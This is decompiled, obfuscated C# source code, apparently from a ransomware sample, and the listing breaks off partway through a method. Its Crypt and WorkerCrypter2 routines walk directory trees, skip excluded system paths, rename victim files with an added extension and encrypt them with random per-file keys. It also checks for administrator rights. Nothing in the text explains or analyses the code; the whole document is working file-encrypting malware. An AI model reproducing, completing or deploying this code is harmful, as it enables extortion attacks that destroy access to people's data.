using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Management;
using System.Net;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security;
using System.Security.AccessControl;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;
using ueLJGJbeRFZOq;
using uuWOPLZnzEM;

namespace sWduCclqEzKrM;

internal sealed class wJkbnIWOteHAMM
{
	public sealed class kMdwmiFmEwFc
	{
		private static StringCollection adrvwDqExCFIJZ;

		private static List<string> nRIPPkBxCTSMA;

		[NonSerialized]
		internal static GetString getString_0;

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, getString_0(107380398));
			}
			catch
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains(getString_0(107380425)) && !text.ToLower().Contains(getString_0(107380372)) && !text.ToLower().Contains(getString_0(107399509)) && !text.ToLower().Contains(getString_0(107399528)) && !text.ToLower().Contains(getString_0(107380391)) && !text.ToLower().Contains(getString_0(107399344)) && !text.ToLower().Contains(getString_0(107399285)) && !text.ToLower().Contains(getString_0(107399300)) && !text.ToLower().Contains(getString_0(107399763)) && !text.ToLower().Contains(getString_0(107399778)) && !text.ToLower().Contains(getString_0(107399744)) && !text.ToLower().Contains(getString_0(107399695)) && !text.ToLower().Contains(getString_0(107399710)) && !text.ToLower().Contains(getString_0(107399665)) && !text.ToLower().Contains(getString_0(107399676)) && !text.ToLower().Contains(getString_0(107399631)) && !text.ToLower().Contains(getString_0(107399650)) && !text.ToLower().Contains(getString_0(107399601)) && !text.ToLower().Contains(getString_0(107399616)) && !text.Contains(AJakXHzLGH(getString_0(107399567))) && !text.Contains(getString_0(107399542)) && !text.Contains(getString_0(107399561)) && !text.EndsWith(getString_0(107412003)) && !text.EndsWith(getString_0(107398992)) && !text.EndsWith(getString_0(107399019)) && !text.EndsWith(getString_0(107399014)) && !text.EndsWith(getString_0(107399009)) && !text.ToLower().Contains(getString_0(107399004)) && !text.ToLower().Contains(UCnmTIRKyzLvN))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(PWOhwOPFeWY) * 1024.0 * 1024.0 && plZapolsnYB == getString_0(107396961))
							{
								nRIPPkBxCTSMA.Add(text);
							}
							else if (File.Exists(text) && plZapolsnYB == getString_0(107396418))
							{
								nRIPPkBxCTSMA.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return nRIPPkBxCTSMA;
		}

		static kMdwmiFmEwFc()
		{
			Strings.CreateGetStringDelegate(typeof(kMdwmiFmEwFc));
			adrvwDqExCFIJZ = new StringCollection();
			nRIPPkBxCTSMA = new List<string>();
		}
	}

	private sealed class jCXiRdJuRChSF
	{
		public string uDsRPfWHLPcsA;

		public bool _003CMain_003Eb__5(Process process_0)
		{
			return process_0.ProcessName == uDsRPfWHLPcsA;
		}
	}

	private sealed class KDnXzLyoGZRl
	{
		public string WFXPyxDTqW;

		public bool _003CIsDriveNTFS_003Eb__1c(DriveInfo driveInfo_0)
		{
			return driveInfo_0.RootDirectory.Name == WFXPyxDTqW;
		}
	}

	private sealed class QYFKNavAtcEa
	{
		private sealed class VZCGPSgOVPlm
		{
			public QYFKNavAtcEa KQbfqRGiKfpHpp;

			public string ZobhaGHKKdtIX;

			public void _003CCrypt_003Eb__22()
			{
				if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
				{
					zLCpNNDmAtopaFC(WindowsIdentity.GetCurrent().Name, ZobhaGHKKdtIX);
				}
			}

			public void _003CCrypt_003Eb__23()
			{
				THyVWCduWKoS(ZobhaGHKKdtIX, KQbfqRGiKfpHpp.VuwaUFxPVVjFnvE, KQbfqRGiKfpHpp.tSVwlNGureOsOAB, KQbfqRGiKfpHpp.oSqWwAtpkJ, KQbfqRGiKfpHpp.YTyfNjYPvgmlaK);
			}
		}

		public string[] VuwaUFxPVVjFnvE;

		public string[] oSqWwAtpkJ;

		public string YTyfNjYPvgmlaK;

		public string tSVwlNGureOsOAB;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CCrypt_003Eb__21(string string_0)
		{
			VZCGPSgOVPlm CS_0024_003C_003E8__locals0 = new VZCGPSgOVPlm();
			CS_0024_003C_003E8__locals0.KQbfqRGiKfpHpp = this;
			CS_0024_003C_003E8__locals0.ZobhaGHKKdtIX = string_0;
			if (jLexrErlPOkRYi && !SIfyghAFRdICD().Contains(getString_0(107363011)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						zLCpNNDmAtopaFC(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.ZobhaGHKKdtIX);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (uzPKfOTMfp == getString_0(107396968))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					THyVWCduWKoS(CS_0024_003C_003E8__locals0.ZobhaGHKKdtIX, CS_0024_003C_003E8__locals0.KQbfqRGiKfpHpp.VuwaUFxPVVjFnvE, CS_0024_003C_003E8__locals0.KQbfqRGiKfpHpp.tSVwlNGureOsOAB, CS_0024_003C_003E8__locals0.KQbfqRGiKfpHpp.oSqWwAtpkJ, CS_0024_003C_003E8__locals0.KQbfqRGiKfpHpp.YTyfNjYPvgmlaK);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				THyVWCduWKoS(CS_0024_003C_003E8__locals0.ZobhaGHKKdtIX, VuwaUFxPVVjFnvE, tSVwlNGureOsOAB, oSqWwAtpkJ, YTyfNjYPvgmlaK);
			}
		}

		static QYFKNavAtcEa()
		{
			Strings.CreateGetStringDelegate(typeof(QYFKNavAtcEa));
		}
	}

	private sealed class mBAKpdaxgGIiSOo
	{
		private sealed class SOFrgJGetW
		{
			public mBAKpdaxgGIiSOo oFTrErWbhZo;

			public string ksQXTBTzfiDke;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__2f()
			{
				foreach (string item in YEHhRPAlgeTZv)
				{
					if (ksQXTBTzfiDke.ToLower().EndsWith(item + oFTrErWbhZo.RhFnHiViAutuY) && qIWeOYgtZSNt == getString_0(107396979))
					{
						if (Convert.ToInt32(BIwQlRShpHJfwXLx) * 1024 * 1024 > new FileInfo(ksQXTBTzfiDke).Length)
						{
							try
							{
								ApOKuNWkxqSR.IxYjJLTMXDzuQu(getString_0(107400743), getString_0(107400710), getString_0(107400733), ksQXTBTzfiDke);
							}
							catch
							{
							}
						}
					}
					else if (ksQXTBTzfiDke.ToLower().EndsWith(item) && qIWeOYgtZSNt == getString_0(107396436))
					{
						try
						{
							ApOKuNWkxqSR.IxYjJLTMXDzuQu(getString_0(107400743), getString_0(107400710), getString_0(107400733), ksQXTBTzfiDke);
						}
						catch
						{
						}
					}
				}
			}

			static SOFrgJGetW()
			{
				Strings.CreateGetStringDelegate(typeof(SOFrgJGetW));
			}
		}

		private sealed class ApqFwhdfUUGrS
		{
			public mBAKpdaxgGIiSOo oFTrErWbhZo;

			public string ANjsgjyoFPfvK;

			[NonSerialized]
			internal static GetString getString_0;

			public void _003CWorkerCrypter2_003Eb__31()
			{
				foreach (string item in YEHhRPAlgeTZv)
				{
					if (ANjsgjyoFPfvK.ToLower().EndsWith(item + oFTrErWbhZo.RhFnHiViAutuY) && qIWeOYgtZSNt == getString_0(107396982))
					{
						if (Convert.ToInt32(BIwQlRShpHJfwXLx) * 1024 * 1024 > new FileInfo(ANjsgjyoFPfvK).Length)
						{
							try
							{
								ApOKuNWkxqSR.IxYjJLTMXDzuQu(getString_0(107400746), getString_0(107400713), getString_0(107400736), ANjsgjyoFPfvK);
							}
							catch
							{
							}
						}
					}
					else if (ANjsgjyoFPfvK.ToLower().EndsWith(item) && qIWeOYgtZSNt == getString_0(107396439))
					{
						try
						{
							ApOKuNWkxqSR.IxYjJLTMXDzuQu(getString_0(107400746), getString_0(107400713), getString_0(107400736), ANjsgjyoFPfvK);
						}
						catch
						{
						}
					}
				}
			}

			static ApqFwhdfUUGrS()
			{
				Strings.CreateGetStringDelegate(typeof(ApqFwhdfUUGrS));
			}
		}

		public List<string> oPxEmDobEjFJfN;

		public List<string> WvtPVeZAyOd;

		public string RhFnHiViAutuY;

		public string[] ohFsjVpBGxFMK;

		public string sQDDlGRIPwQjFTV;

		[NonSerialized]
		internal static GetString getString_0;

		public void _003CWorkerCrypter2_003Eb__2e(string string_0)
		{
			SOFrgJGetW CS_0024_003C_003E8__locals0;
			foreach (string item in WvtPVeZAyOd)
			{
				if (item.Contains(getString_0(107400143)) || item.Contains(getString_0(107400118)) || item.Contains(getString_0(107400085)) || item.ToLower().Contains(getString_0(107399524)) || item.ToLower().Contains(getString_0(107399543)) || item.Contains(getString_0(107399486)) || item.Contains(getString_0(107399465)) || item.ToLower().Contains(getString_0(107399480)) || item.ToLower().Contains(getString_0(107399467)) || item.ToLower().Contains(getString_0(107399398)) || item.ToLower().Contains(getString_0(107399389)) || item.ToLower().Contains(getString_0(107399404)) || item.ToLower().Contains(getString_0(107399378)) || item.ToLower().Contains(getString_0(107399325)) || item.Contains(getString_0(107399300)) || item.Contains(getString_0(107399315)) || item.Contains(getString_0(107399778)) || item.Contains(getString_0(107399793)) || item.Contains(getString_0(107399744)) || item.Contains(getString_0(107399759)) || item.Contains(getString_0(107399710)) || item.Contains(getString_0(107399725)) || item.Contains(getString_0(107399680)) || item.Contains(getString_0(107399691)) || item.ToLower().Contains(getString_0(107399646)) || item.ToLower().Contains(getString_0(107399665)) || item.ToLower().Contains(getString_0(107399616)) || item.ToLower().Contains(getString_0(107399631)) || item.Contains(AJakXHzLGH(getString_0(107399582))) || item.Contains(getString_0(107399557)) || item.Contains(getString_0(107399576)) || item.EndsWith(RhFnHiViAutuY) || item.EndsWith(getString_0(107399007)) || item.EndsWith(getString_0(107399034)) || item.EndsWith(getString_0(107399029)) || item.EndsWith(getString_0(107399024)) || item.Contains(getString_0(107399019)) || item.Contains(UCnmTIRKyzLvN) || item.Contains(VjgrxEUFvvHY) || item.Contains(jUdQCPAqaGpC))
				{
					continue;
				}
				if (ohFsjVpBGxFMK.Length != 0)
				{
					string[] array = ohFsjVpBGxFMK;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0b4a;
					}
				}
				try
				{
					if (item.EndsWith(RhFnHiViAutuY))
					{
						goto IL_0b4a;
					}
				}
				catch (Exception)
				{
					goto IL_0b4a;
				}
				if (!item.EndsWith(string_0) || meZsVdOPaL.Contains(item))
				{
					continue;
				}
				if (hEqjITdFNHN == getString_0(107396976))
				{
					try
					{
						if (cTRLNsgdQpdHDjH.IwGNMUOZCbK(item))
						{
							cTRLNsgdQpdHDjH.QJiNPENvLKcP(item);
						}
					}
					catch
					{
					}
				}
				meZsVdOPaL.Add(item);
				if (!XMwazMiiElRCF.Contains(Path.GetDirectoryName(item)))
				{
					XMwazMiiElRCF.Add(Path.GetDirectoryName(item));
				}
				ZTSNWrphNXPrPP(item);
				try
				{
					try
					{
						if (new FileInfo(item).Length == 0L)
						{
							continue;
						}
					}
					catch (Exception ex2)
					{
						if (nCZIbbbLUfspycLk)
						{
							try
							{
								File.AppendAllText(VjgrxEUFvvHY, getString_0(107363153) + item + getString_0(107380357) + ex2.Message + getString_0(107396285));
							}
							catch (Exception)
							{
							}
						}
						goto end_IL_0518;
					}
					if (IIzcsAXxpCcBT == getString_0(107396976) && new FileInfo(item).Length > Convert.ToInt32(nnEkTZqriSbg) * 1024 * 1024 && !oPxEmDobEjFJfN.Contains(string_0))
					{
						CS_0024_003C_003E8__locals0 = new SOFrgJGetW();
						CS_0024_003C_003E8__locals0.oFTrErWbhZo = this;
						try
						{
							if (RhFnHiViAutuY != getString_0(107363391))
							{
								File.Move(item, item + RhFnHiViAutuY);
							}
						}
						catch (Exception ex4)
						{
							if (nCZIbbbLUfspycLk)
							{
								try
								{
									File.AppendAllText(VjgrxEUFvvHY, getString_0(107363153) + item + getString_0(107380808) + ex4.Message + getString_0(107396285));
									break;
								}
								catch (Exception)
								{
									break;
								}
							}
							break;
						}
						CS_0024_003C_003E8__locals0.ksQXTBTzfiDke = getString_0(107400659);
						if (RhFnHiViAutuY != getString_0(107363391))
						{
							CS_0024_003C_003E8__locals0.ksQXTBTzfiDke = item + RhFnHiViAutuY;
						}
						else
						{
							CS_0024_003C_003E8__locals0.ksQXTBTzfiDke = item;
						}
						if (PFlwcndeNzM == getString_0(107396976))
						{
							Thread thread = new Thread((ThreadStart)delegate
							{
								foreach (string item2 in YEHhRPAlgeTZv)
								{
									if (CS_0024_003C_003E8__locals0.ksQXTBTzfiDke.ToLower().EndsWith(item2 + CS_0024_003C_003E8__locals0.oFTrErWbhZo.RhFnHiViAutuY) && qIWeOYgtZSNt == SOFrgJGetW.getString_0(107396979))
									{
										if (Convert.ToInt32(BIwQlRShpHJfwXLx) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.ksQXTBTzfiDke).Length)
										{
											try
											{
												ApOKuNWkxqSR.IxYjJLTMXDzuQu(SOFrgJGetW.getString_0(107400743), SOFrgJGetW.getString_0(107400710), SOFrgJGetW.getString_0(107400733), CS_0024_003C_003E8__locals0.ksQXTBTzfiDke);
											}
											catch
											{
											}
										}
									}
									else if (CS_0024_003C_003E8__locals0.ksQXTBTzfiDke.ToLower().EndsWith(item2) && qIWeOYgtZSNt == SOFrgJGetW.getString_0(107396436))
									{
										try
										{
											ApOKuNWkxqSR.IxYjJLTMXDzuQu(SOFrgJGetW.getString_0(107400743), SOFrgJGetW.getString_0(107400710), SOFrgJGetW.getString_0(107400733), CS_0024_003C_003E8__locals0.ksQXTBTzfiDke);
										}
										catch
										{
										}
									}
								}
							});
							thread.Priority = ThreadPriority.Normal;
							thread.IsBackground = false;
							thread.Start();
						}
						string text = rhRZQFaGAKbw.cSyqTamvZn(32);
						string s = PmmjrDLLHGk.kPAAXvpwzUaT(text);
						byte[] bytes = Encoding.ASCII.GetBytes(s);
						if (yOzezPMztSZ == getString_0(107396433))
						{
							byte[] array2 = null;
							byte[] byte_ = WZCHsryCBLJ.gsYSnbeqzsbU(CS_0024_003C_003E8__locals0.ksQXTBTzfiDke, Convert.ToInt32(nnEkTZqriSbg) * 1024 * 1024);
							WZCHsryCBLJ.MGSLxQyqoUi(qznoWitgOpFxI: (!flMhwZmYRAGAlC) ? (tRSKQaCWVf ? WZCHsryCBLJ.UMjuORBkcFPFXB(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : WZCHsryCBLJ.UMjuORBkcFPFXB(byte_, Encoding.ASCII.GetBytes(sQDDlGRIPwQjFTV), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (tRSKQaCWVf ? pPEEddGAotfD.hHvJemuiMqqBLp(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : pPEEddGAotfD.hHvJemuiMqqBLp(byte_, Encoding.ASCII.GetBytes(sQDDlGRIPwQjFTV), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ZSIfqWNKFN: CS_0024_003C_003E8__locals0.ksQXTBTzfiDke, kLphRdsGImxW: bytes);
						}
						else if (!tRSKQaCWVf)
						{
							rtnpCOxUAdvUXHj.sKqjBFIZxTw(CS_0024_003C_003E8__locals0.ksQXTBTzfiDke, nnEkTZqriSbg, sQDDlGRIPwQjFTV);
						}
						else
						{
							rtnpCOxUAdvUXHj.sKqjBFIZxTw(CS_0024_003C_003E8__locals0.ksQXTBTzfiDke, nnEkTZqriSbg, text, bytes);
						}
					}
					else
					{
						string text2 = rhRZQFaGAKbw.cSyqTamvZn(32);
						string s2 = PmmjrDLLHGk.kPAAXvpwzUaT(text2);
						byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
						if (RhFnHiViAutuY != getString_0(107363391))
						{
							if (!YMlgZeoTozpwYHf)
							{
								if (!tRSKQaCWVf)
								{
									QFFhZSkATgYb(item, item + RhFnHiViAutuY, rSFrHwQLaPb);
								}
								else
								{
									QFFhZSkATgYb(item, item + RhFnHiViAutuY, Encoding.ASCII.GetBytes(text2));
								}
							}
							else
							{
								try
								{
									if (!tRSKQaCWVf)
									{
										nhFkvndgnMEoAU(item, item + RhFnHiViAutuY, rSFrHwQLaPb);
									}
									else
									{
										nhFkvndgnMEoAU(item, item + RhFnHiViAutuY, Encoding.ASCII.GetBytes(text2));
									}
								}
								catch (Exception ex6)
								{
									if (nCZIbbbLUfspycLk)
									{
										try
										{
											File.AppendAllText(VjgrxEUFvvHY, getString_0(107363153) + item + getString_0(107363409) + ex6.Message + getString_0(107396285));
										}
										catch (Exception)
										{
										}
									}
								}
							}
						}
						else if (!YMlgZeoTozpwYHf)
						{
							if (!tRSKQaCWVf)
							{
								QFFhZSkATgYb(item, item + getString_0(107363418), rSFrHwQLaPb);
							}
							else
							{
								QFFhZSkATgYb(item, item + getString_0(107363418), Encoding.ASCII.GetBytes(text2));
							}
						}
						else
						{
							try
							{
								if (!tRSKQaCWVf)
								{
									nhFkvndgnMEoAU(item, item, rSFrHwQLaPb);
								}
								else
								{
									nhFkvndgnMEoAU(item, item, Encoding.ASCII.GetBytes(text2));
								}
							}
							catch (Exception ex8)
							{
								if (nCZIbbbLUfspycLk)
								{
									try
									{
										File.AppendAllText(VjgrxEUFvvHY, getString_0(107363153) + item + getString_0(107363409) + ex8.Message + getString_0(107396285));
									}
									catch (Exception)
									{
									}
								}
							}
						}
						if (tRSKQaCWVf)
						{
							if (RhFnHiViAutuY != getString_0(107363391))
							{
								jPPfleEdfBACeW(item + RhFnHiViAutuY, bytes2);
							}
							else
							{
								jPPfleEdfBACeW(item, bytes2);
							}
						}
					}
					goto IL_0b4a;
					end_IL_0518:;
				}
				catch (Exception)
				{
					goto IL_0b4a;
				}
				continue;
				IL_0b4a:
				WvtPVeZAyOd.Remove(item);
			}
		}

		public void _003CWorkerCrypter2_003Eb__30(string string_0)
		{
			ApqFwhdfUUGrS CS_0024_003C_003E8__locals0 = new ApqFwhdfUUGrS();
			CS_0024_003C_003E8__locals0.oFTrErWbhZo = this;
			CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK = string_0;
			if (!CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(getString_0(107400143)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(getString_0(107400118)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(getString_0(107400085)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(getString_0(107399524)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(getString_0(107399543)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(getString_0(107399486)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(getString_0(107399465)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(getString_0(107399480)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(getString_0(107399467)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(getString_0(107399398)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(getString_0(107399389)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(getString_0(107399404)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(getString_0(107399378)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(getString_0(107399325)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(getString_0(107399300)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(getString_0(107399315)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(getString_0(107399778)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(getString_0(107399793)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(getString_0(107399744)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(getString_0(107399759)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(getString_0(107399710)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(getString_0(107399725)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(getString_0(107399680)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(getString_0(107399691)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(getString_0(107399646)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(getString_0(107399665)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(getString_0(107399616)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().Contains(getString_0(107399631)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(AJakXHzLGH(getString_0(107399582))) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(getString_0(107399557)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(getString_0(107399576)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.EndsWith(RhFnHiViAutuY) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.EndsWith(getString_0(107399007)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.EndsWith(getString_0(107399034)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.EndsWith(getString_0(107399029)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.EndsWith(getString_0(107399024)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(getString_0(107399019)) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(UCnmTIRKyzLvN) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(VjgrxEUFvvHY) && !CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.Contains(jUdQCPAqaGpC))
			{
				if (ohFsjVpBGxFMK.Length != 0)
				{
					string[] array = ohFsjVpBGxFMK;
					int num = 0;
					while (num < array.Length)
					{
						string value = array[num];
						if (!CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0cc3;
					}
				}
				try
				{
					if (CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.EndsWith(RhFnHiViAutuY))
					{
						goto IL_0cc3;
					}
				}
				catch (Exception)
				{
					goto IL_0cc3;
				}
				if (!meZsVdOPaL.Contains(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK))
				{
					if (hEqjITdFNHN == getString_0(107396976))
					{
						try
						{
							if (cTRLNsgdQpdHDjH.IwGNMUOZCbK(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK))
							{
								cTRLNsgdQpdHDjH.QJiNPENvLKcP(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK);
							}
						}
						catch
						{
						}
					}
					meZsVdOPaL.Add(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK);
					if (!XMwazMiiElRCF.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK)))
					{
						XMwazMiiElRCF.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK));
					}
					ZTSNWrphNXPrPP(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK);
					try
					{
						try
						{
							if (new FileInfo(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK).Length != 0L)
							{
								goto end_IL_0636;
							}
							goto end_IL_0636_2;
							end_IL_0636:;
						}
						catch (Exception ex2)
						{
							if (nCZIbbbLUfspycLk)
							{
								try
								{
									File.AppendAllText(VjgrxEUFvvHY, getString_0(107363153) + CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + getString_0(107380357) + ex2.Message + getString_0(107396285));
								}
								catch (Exception)
								{
								}
							}
							goto end_IL_0636_2;
						}
						if (IIzcsAXxpCcBT == getString_0(107396976) && new FileInfo(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK).Length > Convert.ToInt32(nnEkTZqriSbg) * 1024 * 1024)
						{
							try
							{
								if (RhFnHiViAutuY != getString_0(107363391))
								{
									File.Move(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + RhFnHiViAutuY);
								}
							}
							catch (Exception ex4)
							{
								if (nCZIbbbLUfspycLk)
								{
									try
									{
										File.AppendAllText(VjgrxEUFvvHY, getString_0(107363153) + CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK + getString_0(107380808) + ex4.Message + getString_0(107396285));
										return;
									}
									catch (Exception)
									{
										return;
									}
								}
								return;
							}
							if (RhFnHiViAutuY != getString_0(107363391))
							{
								CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK += RhFnHiViAutuY;
							}
							if (PFlwcndeNzM == getString_0(107396976))
							{
								Thread thread = new Thread((ThreadStart)delegate
								{
									foreach (string item in YEHhRPAlgeTZv)
									{
										if (CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().EndsWith(item + CS_0024_003C_003E8__locals0.oFTrErWbhZo.RhFnHiViAutuY) && qIWeOYgtZSNt == ApqFwhdfUUGrS.getString_0(107396982))
										{
											if (Convert.ToInt32(BIwQlRShpHJfwXLx) * 1024 * 1024 > new FileInfo(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK).Length)
											{
												try
												{
													ApOKuNWkxqSR.IxYjJLTMXDzuQu(ApqFwhdfUUGrS.getString_0(107400746), ApqFwhdfUUGrS.getString_0(107400713), ApqFwhdfUUGrS.getString_0(107400736), CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK);
												}
												catch
												{
												}
											}
										}
										else if (CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK.ToLower().EndsWith(item) && qIWeOYgtZSNt == ApqFwhdfUUGrS.getString_0(107396439))
										{
											try
											{
												ApOKuNWkxqSR.IxYjJLTMXDzuQu(ApqFwhdfUUGrS.getString_0(107400746), ApqFwhdfUUGrS.getString_0(107400713), ApqFwhdfUUGrS.getString_0(107400736), CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK);
											}
											catch
											{
											}
										}
									}
								});
								thread.IsBackground = false;
								thread.Priority = ThreadPriority.Normal;
								thread.Start();
							}
							string text = rhRZQFaGAKbw.cSyqTamvZn(32);
							string s = PmmjrDLLHGk.kPAAXvpwzUaT(text);
							byte[] bytes = Encoding.ASCII.GetBytes(s);
							if (yOzezPMztSZ == getString_0(107396433))
							{
								byte[] array2 = null;
								byte[] byte_ = WZCHsryCBLJ.gsYSnbeqzsbU(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, Convert.ToInt32(nnEkTZqriSbg) * 1024 * 1024);
								WZCHsryCBLJ.MGSLxQyqoUi(qznoWitgOpFxI: (!flMhwZmYRAGAlC) ? (tRSKQaCWVf ? WZCHsryCBLJ.UMjuORBkcFPFXB(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : WZCHsryCBLJ.UMjuORBkcFPFXB(byte_, Encoding.ASCII.GetBytes(sQDDlGRIPwQjFTV), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })) : (tRSKQaCWVf ? pPEEddGAotfD.hHvJemuiMqqBLp(byte_, Encoding.ASCII.GetBytes(text), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 }) : pPEEddGAotfD.hHvJemuiMqqBLp(byte_, Encoding.ASCII.GetBytes(sQDDlGRIPwQjFTV), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 })), ZSIfqWNKFN: CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, kLphRdsGImxW: bytes);
							}
							else if (!tRSKQaCWVf)
							{
								rtnpCOxUAdvUXHj.sKqjBFIZxTw(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, nnEkTZqriSbg, sQDDlGRIPwQjFTV);
							}
							else
							{
								rtnpCOxUAdvUXHj.sKqjBFIZxTw(CS_0024_003C_003E8__locals0.ANjsgjyoFPfvK, nnEkTZqriSbg, text, bytes);
							}
						}
						else
						{
							string text2 = rhRZQFaGAKbw.cSyqTamvZn(32);
							string s2 = PmmjrDLLHGk.kPAAXvpwzUaT(text2);
							byte[] bytes2 = Encoding.ASCII.GetBytes(s2);
							if (RhFnHiViAutuY != getString_0(107363391))
							{
								if (!YMlgZeoTozpwYHf)
								{
									if (!tRSKQaCWVf)
									{
